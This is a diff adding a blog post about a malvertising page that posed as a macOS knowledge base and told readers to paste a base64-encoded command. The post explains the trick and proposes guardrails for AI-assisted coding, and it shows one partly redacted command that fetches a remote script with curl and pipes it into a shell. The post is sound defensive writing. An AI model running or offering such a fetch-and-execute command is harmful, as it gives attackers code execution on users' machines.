@@ -1,0 +1,64 @@
+---
+title: "Vibe coding is here — so let's build the guardrails"
+description: "A harmless attempt to uncompress a file on macOS, and why AI-assisted coding now needs real guardrails."
+pubDate: 2026-02-11
+tags: [ai, vibe-coding, developer-experience]
+heroImage: ../../assets/posts/vibe-coding-guardrails/sponsored-result.jpg
+heroAlt: "A sponsored search result labelled claude.ai, advertising “7Zip for Mac” to unzip RAR files on macOS"
+originalUrl: https://www.linkedin.com/pulse/vibe-coding-here-so-lets-build-guardrails-jason-jebanesan-6ystc
+originalSource: LinkedIn
+syndicate: false
+---
+
+import { Image } from 'astro:assets';
+import knowledgeBasePage from '../../assets/posts/vibe-coding-guardrails/knowledge-base-page.jpg';
+import base64ToZsh from '../../assets/posts/vibe-coding-guardrails/base64-to-zsh.jpg';
+
+I was doing something harmless: trying to quickly uncompress a .rar file on macOS. I googled for a simple bash approach (fun fact: I didn't find a clean one I liked).
+
+Then I saw a **sponsored result** that looked oddly legitimate, pointing to a well-known AI brand's domain. That alone felt off: *why would an AI site be advertising RAR tooling?*
+
+<Image
+	src={knowledgeBasePage}
+	alt="A fake “macOS Knowledge Base” page marked as verified, telling the reader to open Terminal and paste in a long base64-encoded command"
+	width={503}
+	densities={[1, 2]}
+/>
+
+The page looked like a “knowledge base” article telling me to run a Terminal command. And right there was the giveaway: **a big base64 blob**. Anyone who's spent time in security knows what comes next…
+
+<Image
+	src={base64ToZsh}
+	alt="Close-up of the end of the command, where the base64 text is decoded and piped straight into zsh"
+/>
+
+Decode it and it becomes the classic pattern:
+
+- friendly message like “verification…”
+- curl pulling a remote script
+- piping it straight into a shell
+
+In other words: **remote code execution disguised as “helpful instructions.”**
+
+```sh
+echo 'Verification please wait...' && curl -vvvvvvvvv http://testtttttt.com/curl/04245639b3c0cc0998f5bb87b1c60c5f2f | zshhh
+```
+
+That's a pattern every engineer should recognize: encoded payload → decode → fetch remote script → execute. (**And yes, I'm intentionally redacting the URL and full command so nobody runs it by accident.**)
+
+This isn't just “malware on the internet.” It's a preview of the *next* problem: as more of us use AI to generate code quickly, we're going to see more “looks legit” instructions — ads, snippets, generated answers — that are **directionally correct but operationally unsafe**.
+
+And to be clear: **vibe coding isn't the enemy.** It's becoming part of engineering like Stack Overflow was, like package managers are, like copy/paste snippets always have been. The question is: **how do we adopt it responsibly?**
+
+## The guardrails I think every team needs (especially with AI-assisted coding)
+
+- Treat AI output as *untrusted input* until validated
+- Require PR reviews + security review for anything that touches auth, data access, infra, CI/CD
+- Add automated checks: SAST, dependency scanning, secret scanning, SBOMs
+- Make “explain what this does” a norm: if you can't explain it, don't merge it
+
+This is exactly what secure SDLC guidance has been telling us for years — we're just entering a world where **the volume and speed of generated code** makes those practices non-negotiable. ([NIST SSDF](https://csrc.nist.gov/projects/ssdf) is a solid baseline if you want something concrete to align to.)
+
+Also worth remembering: **malvertising is real** — attackers buy ad placements in search results precisely because people trust top links.
+
+Vibe coding will absolutely help teams move faster. But speed without guardrails becomes an incident.
